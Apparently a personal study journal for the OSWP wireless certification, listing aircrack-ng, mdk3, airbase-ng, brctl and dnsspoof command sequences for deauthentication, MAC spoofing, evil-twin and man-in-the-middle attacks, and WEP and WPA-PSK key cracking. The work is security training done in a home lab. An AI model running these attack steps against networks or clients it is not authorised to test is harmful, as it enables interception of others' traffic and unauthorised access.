# Pentester wifi pentest journal

Progress I have learnt for OSWP through pentester academy wifi megaprimer.

## 1) Wifi basics :
* ifconfig -a
* lsmod
* ifconfig wlan0 up (leoxsys/alfa king)
* airmon-ng
* airmon-ng start wlan0
* ifconfig/iwconfig

## 2) Bands channels and surfing
* wireshark & (capture wireshark interface in wlan0mon)
* iwconfig wlan0 channel 1
* airodump-ng --band bg wlan0mon

## 3) Pwning beacon frames :
* mdk3 --help
* mdk3 wlan0mon b -n Pwned

## 4) Dissecting AP-Client connections :
* airodump-ng wlan0mon (check which channel it is )
* iwconfig wlan0mon channel 1
* wireshark & (wlan addr === ((access mac)) && not selected beacon frames )
* connect wifi through a phone
* wireshark & (wlan addr === ((access mac)) && wlan addr === ((client mac)) )
  * probe req packets 1 ) broadcast packets(identifying) 2 ) client queries for a specific access point
  * Auth request and auth response
  * association request and association response.
  * ARP response
  * data transfer

## 5) WLAN Headers :
Check the separate WLAN headers page for theory part.

## 6) Pwning Hidden SSIDs :

#### Hidden SSID : // Hardly a challenge for experienced wireless hacker
* Turn ssid broadcasting OFF in beacon frames
* just monitoring beacon frames will not give you the ssid
* A "security through obscurity"technieuq at best
* Can only deter novices

(set the visibility status in the router page for hidden ssid)

#### Multiple techniques
* Monitor air for a new client trying to associate with the access point (passive)
* de-authenticate one or all clients and monitor reconnections ( active)

* basic idea is to force the network to send probe/association pakets
* these packets contain the ssid even if not present in the beacon frame from the access point

```
airodump-ng wlan0mon --channel 1 --bssid (mac of the router)

aireplay-ng --deauth 0 -a (bssid mac) wlan0mon
```
check for the flow of deauth,probe,association and auth packets in wireshark


## 7) Laughing off MAC Filters :

* MAC address are visible in plain sight. (Enable mac filter in  router in advanced section)
```
aireplay-ng --fakeauth 10 -e <ESSID> wlan0mon
```
Authentication fails due to mac filtering.
spoof the mac address :
```
aireplay-ng --fakeauth 10 -e <ESSID> -h <mac address> wlan0mon
```
Conclusion : MAC filtering is useless scheme. There's no defense at all. Even in an airport/restaurants which SSO login, we can clone anyone's MAC and use wifi.

## 8) Hacking WLAN Authentication :
* Open and shared authentication.
* No actual authentication.
* WEP uses rc4

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write demo
```
Auth key has no value. When connected a device to access point, it will decide if its open or shared key.

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write fakeauth

aireplay-ng --fakeauth 10 wlan0mon -e <essid> -y demo  // (demo is a sample keystream xor file)
```
## 9) Hotspot attacks :

Hotspot basic:
 * open authentication.
 * MAC filtering at times
 * No encryption - distribution of keys would be a nightmare
 * Can use captive portals for application layer authentication

create am evil twin in the vicinity
 * Same essid
 * Same bssid ( optional )

Use de-authentication attacks to break client AP connection. If evil twin has higher signal strength, then client will connect to it.

Attack visualization :
1) Metasploit
2) MITM to client

Change channel :
```
iwconfig wlan0mon channel 11
```
Create access on channel 11 :
```
airbase-ng -a AA:AA:AA:AA:AA:AA -e <ESSID> wlan0mon //ESSID = SecurityTube
```
Created tap0 interface // wired interface
```
ifconfig at0 up

aireplay-ng --deauth 0 -a <bssid> wlan0mon
```
Change channel if its using multiple channel
```
iwconfig wlan0mon channel 1
```
Airbase and Aireplay at same point.

Client sends gratuitous arp to check for dhcp in fake AP.
```
ifconfig at0 169.254.174.226 netmask 255.255.255.0 up

ping 169.254.174.227
```
IP level connection is established. 

## 10) Hacking isolated clients :

* Multiple cases possible :
 Access point stored in the PNL or similar could have either of 3 configurations :
 	* No encyrption
   	* WEP
	* WPA/WPA2

Case 1 : open auth, no encryption
```
airbase-ng --essid <essid> -a AA:AA:AA:AA:AA:AA wlan0mon
```
-v for verbose
wireshark the packets :
#### wlan.addr == (bssid) && wlan.addr == AA:AA:AA:AA:AA:AA 

Client will try for DHCP. So check for at0 interface.
```
airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA wlan0mon -v
```
Check the client device. Your client device will be hopping all connections which is weird because it is confused by the ESSID. Reasons ?
 * Client cannot authenticate the access point
 * SSID all alone is used to decide whom to connect to
 * Anyone can set a similar ssid and force a client to connect to their access point
 * This is especially true with hotspot ssids as they by definition are open authentication with no encryption.

## 11) ALFA card king-fu :
Check the separate ALFA-card kung-fu page for theory part.

## 12) Man-in-the-middle-attacks :

#### Bring in both the ethernet and airbase interfaces :
```
ifconfig
ifconfig eth0 up

airbase-ng --essid <ESSID> wlan0mon

ifconfig at0 up
```

#### Bridge both the interfaces :
```
brctl addbr mitm

brctl show
```
No interface will be there. 
#### Add an interface :
```
brctl addif mitm at0

brctl addif mitm eth0

ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up

ifconfig mitm up
```
#### Assign an ip address to mitm inteface :
```
dhclient3 mitm &

ifconfig mitm
```
An ip address is already allocated over dhcp.
Now connect a client to your wifi. You have access of viewing the victim data but victim has no idea of the MITM.

## 13) SSL-Man-in-the-middle-attacks :
We can use DNS spoofing for ssl mitm.
First bridge interface mitm through at0 and eth0.
```
dnsspoof -i mitm
```
Open burp and add ports 80 and 443 and add invisible proxy option.
Intercept off and forward all requests. Notice the dnsspoof.

Try gmail. browser couldnt verify server identity.

## 14) WEP in depth :
Check the separate WEP in detail page for theory part.

## 15) WEP Cracking :
ARP Request packet is broadcast packet and ARP Response is an unicast packet.

How does the Attacker identify the ARP Packets ? Aren't they all encrypted ? ARP Packets are of a fixed unique size, easy to identify even if encrypted.

1) Capture ARP Request packets using encrypted packet size back.
2) Replay them blindly, and see if the network responds back.
3) If Yes, then we found ourselves winner.
```
airodump-ng --channel 1 wlan0mon

airodump-ng --channel 1 wlan0mon --write OnlineCracking --bssid <victim>
```
Connect the client to the victim access point.

Detect and replay the attack:
```
aireplay-ng --arpreplay -e <essid> wlan0mon
```
0 arp requests found. 

First deauth the client:
```
aireplay-ng --deauth 0 -e <essid> wlan0mon
```
Data packets will generate.
```
aireplay-ng --deauth 0 -e <essid> -h <mac of essid> wlan0mon
```
Now aireplay and deauth :
```
aireplay-ng --deauth 0 -e <essid> wlan0mon
```
Now it will send tons of packets which will get accepted by access point.

But data will not increase. Need to specify the mac for arpreplay for client mac.

```
aireplay-ng --arpreplay -e <essid> -h <clientmac> wlan0mon
```

Now start aircrack
```
aircrack-ng OnlineCracking-01.cap
```
The AB(12343) , AB is the possible byte and the numbers of vote for possible match by IVs.

The key gets cracked in a few minutes.

## 16) Cafee-latte attack basics :
Check the separate caffe-latte basics page for theory part.

## 17) Cafee-latte attack demo :

* Details:
	* Once the client connects to the fake AP it will send out DHCP requests
	* DHCP will time out eventually(Caffe-latte works in static as well)
	* Auto-configuration IP address will kick in
	* Client will send a gratuitous ARP packet

* Create a fake AP :

```
airbase-ng -c 1 --essid <essid> wlan0mon -W 1
```

In wireshark, we can see DHCP packets.

If we monitor for Logical-Link control - > type : arp,
we can see gratuitious arp packets. If we had not enabled decryption, we wont see anything.
```
airbase-ng -c 1 --essid <essid> wlan0mon -W 1 -L -x 10
```
To store the packets :
```
airodump-ng --channel 1 -e <essid> wlan0mon --write CaffeLatte-Demo

// or

airodump-ng --channel 1 wlan0mon --write CaffeLatte-Demo 
```
(since only 1 acccess point is there)
(can use -b for the bssid)

Once we see the arp requests, we can check the arp responses.
Filter out requests and check for responses.
The initialization vector in IEEE 802.11 changes in all packets.

On average, it takes 6 minutes to crack the WEP key.

Note : Use base machine instead of VM so not to hang VM due to huge I/O over the USB.

## 18) Koreks chop-chop attack :

This also works in message modification vulnerability

Encrypted data is chopped into several pieces for the encrypted data.

1) First the last byte is chopped off from the encrypted data near the encrypted ICV
2) So the new byte is one byte shorter since Korek does not know the plain text value of the byte to replace it in the original place.
3) Sends the packet to multicast address (AP)

Similarly a lot of guesses are done to accept the packet with new ICV :

| Guess | New-ICV | Accepted |
|-------|---------|----------|
| 00    | ICV-1	  |  No      |
| 01    | ICV-2	  |  No      |
| .     |   .	  |  .       |
| FA    | ICV-n	  |  Yes !   |

So 1 byte of the packet is decrypted.

#### End result:
* Decrypt entire WEP Packet byte by byte
* Can be orchestrated in 2 modes: 
	* Some APs send a de-authentication packet if the WEP Packet is valid but MAC is not associated
	* May not work always.

```
aireplay-ng --chopchop -e <essid> wlan0mon
```
Wireshark the bssid of the essid and remove beacon frames

Once the aireplay is stopped, it will ask for use the packet.

press 'y'. Decryption process will start.

Plain text packet is saved in cap file.

Wireshark the packet :
```
wireshark <packet.cap>
```
This is the procedure to decrypt a packet without a decrption key using chopchop attack.

## 19) Fragmentation and Hirte attack :
#### Understanding fragmentation :
There will be a very large frame to transfer over wireless. So we need to break the frame into fragments.
Sequence control in the IEEE 802.11 is broken into fragment number and sequence number.
There is also one more bit from frame control field called "more fragments"
This fragment will be set to 1.

* Details :
	* LLC header is known.
	* Size of the LLC header is 8 bytes.
	* The only unknown thing is Ether type.
	* Size of the LLC can determine ARP or IP. Can be guessed by type.

#### Packet Breakup :

Encrypted Data			Enc ICV  
XOR  
LLC 	8 bytes  
||  
RC4 Keystream  
  
What do we have ?  
RC4 Key stream |  8 bytes of keystream + corresponding IV  
  
Data 	ICV  
4	4  
  
||  
VV  
  
XOR		---> Encrypted data    ICV  
  
^^  
||  
RC4 Keystream  
(8 bytes)  
  
Fragmentation to the rescue

4	4	4  
  
Data 	To be	Sent  
	|  
	|--------------------------------------------------------  
	|------------------------------|------------------------|  
Encrypted Data 1  ICV-1 	Encrypted Data2 ICV-2	Encrypted Data 3  ICV-3  
  

	* Up to 16 fragments can be sent
	* Each can carry 4 bytes of data
	* Total 64 bytes can be injected

* Hirte attack:
	* Uses  key concepts from the caffe latte attack and fragmentation attack
	* Targets an isolated client, allows association, waits for an ARP packet like the caffe latte
	* Converts that into an ARP request for the same client by relocating the IP address in the ARP header using fragmentation and patches using Message modification flaw
	* Client accepts packet and sends replies
	* GAME OVER!
```
airbase-ng -c 1 --essid <essid> -W 1 wlan0mon -N 
```
(-N for hirte attack)
```
airodump-ng --channel 1 wlan0mon --write Hirte
```
The data packets will start pumping rapidly.
```
aircrack-ng Hirte-01.cap
```

## 20) Understanding WPA/ WPA2 Attacks :
Check the wpa-wpa2 understanding page for theory part.


## 21) WPA PSK :
Check the wpa-wpa2 understanding page and look for the WPA extended understanding the for theory part.

## 22) WPA PSK cracking :

Most possible way is WPA-PSK Dictionary attack in aircrack-ng method and cowpatty method.

#### Aircrack-ng method :
```
airodump-ng wlan0mon --channel 1

airodump-ng wlan0mon --channel 1 --write dlink-psk (Just a name)

aircrack-ng dlink-psk-01.cap
```
It requires a dictionary file. Creating a dummy dictionary file :
```
echo qwertyui > dict

aircrack-ng dlink-psk-01.cap -w dict
```
Passphrase not in dictionary. Append the actual password :
```
echo securitytube >> dict

aircrack-ng dlink-psk-01.cap -w dict
```

#### Cowpatty method:
```
cowpatty -f dict -r dlink-psk-01.cap -s dlink
```
Which packet do we need in the handshake ?
	* All packets have the AP MAC and client MAC
	* ANonce
		* Packet 1 and Packet 3
	* SNonce
		* Packet 2

Answer : (Either All 4 packets), or (Packets 1 and 2) or (packet 2 and 3)

#### Decrypting WPA-PSK Traces :
* Using Wireshark
* Airedecap-ng :
```
airdecap-ng -e dlink -p securitytube dlink-psk-01.cap

wireshark dlink-psk-01-dec.cap
```
Note : airdecap is not correct always as it fails to decrypt wpa.  
Can use like :
```
airdecap-ng -e dlink -p securitytube demo232-01.cap -b (mac of client)

wireshark demo232-01-dec.cap &
```
Now we are able to decrypt all the packets.

PS : Airedecap has a small bug in this.

## 23) WPA-2 PSK cracking :


